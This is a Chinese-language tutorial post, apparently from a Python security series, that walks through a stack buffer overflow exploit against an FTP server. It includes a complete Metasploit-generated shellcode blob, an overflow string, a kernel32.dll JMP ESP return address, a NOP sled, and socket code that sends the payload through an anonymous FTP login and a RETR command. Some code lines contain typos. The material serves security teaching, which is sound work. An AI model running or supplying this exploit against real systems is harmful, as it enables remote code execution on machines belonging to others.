# 原创
：  【Python脚本进阶】2.5、编写自己的0day概念验证代码：栈的缓冲区溢出攻击、添加攻击关键元素、发送漏洞利用代码

# 【Python脚本进阶】2.5、编写自己的0day概念验证代码：栈的缓冲区溢出攻击、添加攻击关键元素、发送漏洞利用代码

**目录**

[一、概述](#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0)

[二、基于栈的缓冲区溢出攻击](#%E4%BA%8C%E3%80%81%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB)

[2.1、简介：](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[2.2、基本术语：](#2.2%E3%80%81%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD%EF%BC%9A)

[三、添加攻击的关键元素](#%E4%B8%89%E3%80%81%E6%B7%BB%E5%8A%A0%E6%94%BB%E5%87%BB%E7%9A%84%E5%85%B3%E9%94%AE%E5%85%83%E7%B4%A0)

[ 3.1、实现：](#%C2%A03.1%E3%80%81%E5%AE%9E%E7%8E%B0%EF%BC%9A)

[四、发送漏洞利用代码](#%E5%9B%9B%E3%80%81%E5%8F%91%E9%80%81%E5%87%85%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81)

[4.1、分析：](#%E5%88%86%E6%9E%90%EF%BC%9A)

[4.2、实现：](#%C2%A0%E5%AE%9E%E7%8E%B0%EF%BC%9A)

---


## 一、概述

> 
虽然在Metasploit框架的工具库中包含有超过800个各不相同的漏洞利用代码， 但你还是会碰到必须自己编写远程漏洞利用代码的那一刻。用Python简化这个过程，先搞明白基于栈的缓冲区溢
<hr/>
Morris蠕虫成功的原因在某种程度上其实就是利用了栈的缓冲区溢出。此类漏洞之所以能被成功利用， 是由千程序没能过滤或验证用户的输入。


---


---


## 二、基于栈的缓冲区溢出攻击

> 
<h3>2.1、简介：</h3>
在基于栈的缓冲区溢出中， 未经检查的用户数据会覆盖下一个会被执行的指令指针（EIP）的方式控制程序的执行流。这种漏洞利用代码会直接让EIP寄存器指向攻击者插入的sbellcode上的某个位置。一系列的机器码指令（也称sbellcode)会让漏洞利用代码在目标系统中添加额外的用户， 与攻击者建立一个网络连接， 或是下载一个独立的可执行文件。
<hr/>
Shellcode的大小几乎是没有限制的， 其大小仅仅取决于内存可用空间的大小。如今各种不同的利用不同类型凋洞的方法已经有很多， 而基于栈的缓冲区溢出是其中最<br/> 基本的。


> 
<h3>2.2、基本术语：</h3>
溢出： 用户的输入长度超出栈中对它最大长度的预期， 即分配的内存大小
<hr/>
返回地址：用于直接跳转到栈顶部的4B的地址。下面漏洞利用中， 将使用一个在kernel32.dl中某条JMP ESP指令的地址（指针的长度为4B)。<br/> Padding:在shellcode之前的一系列NOP（无操作）指令， 它使攻击者预估直接跳转到那里去<br/> 的地址时， 能放宽的精度要求。只要它跳转到NOP链的任意地方， 可直接滑到shellcode那里。<br/> shellcode: 一小段用汇编语言编写的机器码。在下面的例子中， 我们用Metasploit框架生成<br/> shellcode。


---


---


## 三、添加攻击的关键元素

> 
<h3> 3.1、实现：</h3>
开始编写漏洞利用代码中的关键元素。
首先， 我们在shellcode变量中写入用Metasploit框架生成的载荷的十六进制码。
然后， 在overflow变蜇中写入246个字母“ A"（十六进制值是\x41)。
接若让ret变量指向kernel32.dll中的一个含有把控制流直接跳转到栈顶部的指令的地址。我们的padding变量中是150个NOP指令。这就构成了NOP链。
最后，把所有这些变量组合在一起形成我们称之为crash的变量。

<pre><code>shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
"\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
"\x83\x85\x07\xb0\x53\xf6\x8e\x55\x62\x24\xf4\x1e\xd6\xf8"
"\x7e\x72\xda\x73\xd2\x67\x69\xf1\xfb\x88\xda\xbc\xdd\xa7"
"\xdb\x70\xe2\x64\x1f\x12\x9e\x76\x73\xf4\x9f\xb8\x86\xf5"
"\xd8\xa5\x68\xa7\xb1\xa2\xda\x58\xb5\xf7\xe6\x59\x19\x7c"
"\x56\x22\x1c\x43\x22\x98\x1f\x94\x9a\x97\x68\x0c\x91\xf0"
"\x48\x2d\x76\xe3\xb5\x64\xf3\xd0\x4e\x77\xd5\x28\xae\x49"
"\x19\xe6\x91\x65\x94\xf6\xd6\x42\x46\x8d\x2c\xb1\xfb\x96"
"\xf6\xcb\x27\x12\xeb\x6c\xac\x84\xcf\x8d\x61\x52\x9b\x82"
"\xce\x10\xc3\x86\xd1\xf5\x7f\xb2\x5a\xf8\xaf\x32\x18\xdf"
"\x6b\x1e\xfb\x7e\x2d\xfa\xaa\x7f\x2d\xa2\x13\xda\x25\x41"
"\x40\x5c\x64\x0e\xa5\x53\x97\xce\xa1\xe4\xe4\xfc\x6e\x5f"
"\x63\x4d\xe7\x79\x74\xb2\xd2\x3e\xea\x4d\xdc\x3e\x22\x8a"
"\x88\x6e\x5c\x3b\xb0\xe4\x9c\xc4\x65\xaa\xcc\x6a\xd5\x0b"
"\xbd\xca\x85\xe3\xd7\xc4\xfa\x14\xd8\x0e\x8d\x12\x16\x6a"
"\xde\xf4\x5b\x8c\xf1\x58\xd5\x6a\x9b\x70\xb3\x25\x33\xb3"
"\xe0\xfd\xa4\xcc\xc2\x51\x7d\x5b\x5a\xbc\xb9\x64\x5b\xea"
"\xea\xc9\xf3\x7d\x78\x02\xc0\x9c\x7f\x0f\x60\xd6\xb8\xd8"
"\xfa\x86\x0b\x78\xfa\x82\xfb\x19\x69\x49\xfb\x54\x92\xc6"
"\xac\x31\x64\x1f\x38\xac\xdf\x89\x5e\x2d\xb9\xf2\xda\xea"
"\x7a\xfc\xe3\x7f\xc6\xda\xf3\xb9\xc7\x66\xa7\x15\x9e\x30"
"\x11\xd0\x48\xf3\xcb\x8a\x27\x5d\x9b\x4b\x04\x5e\xdd\x53"
"\x41\x28\x01\xe5\x3c\x6d\x3e\xca\xa8\x79\x47\x36\x49\x85"
"\x92\xf2\x79\xcc\xbe\x53\x12\x89\x2b\xe6\x7f\x2a\x86\x25"
"\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10"
"\xba\x1e\x53\x31")
overflow = "\x41" * 246
ret = struct.pack ('&lt;L', Ox7C874413) #7C874413 JMP ESP kernel32.dll
padding = "\x90" * 150
crash = overflow + ret + padding + shellcode</code></pre>


---


---


## 四、发送漏洞利用代码

> 
<h3>4.1、分析：</h3>
使用Berkeley Socket APL 可以与目标主机上的TCP 21 端口创建一个连接。如果成功连接，匿名登录主机。最后会发送FTP命令'RETR", 后面接上crash 变量。因为受影响的程序无法正确检查用户输入， 就引发了基于栈的缓冲区溢出， 它会覆盖EIP寄存器， 使程序直接跳转到shellcode 那里， 并执行它


> 
<h3>4.2、实现：</h3>
<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, 21))
except:
    print('[-]Connection to ' + target + 'failed!')
    sys.exit(0)
print('[*] Sending ' + 'len(crash)' + '  '+ command + ' byte crash... ')
s.send("USER anonymous\r\n")
s.recv(1024)
s.send('PASS \r\n')
s.recv(1024)
s.send('RETR' + ' ' + crash + '\r\n')
time.sleep(4)</code></pre>

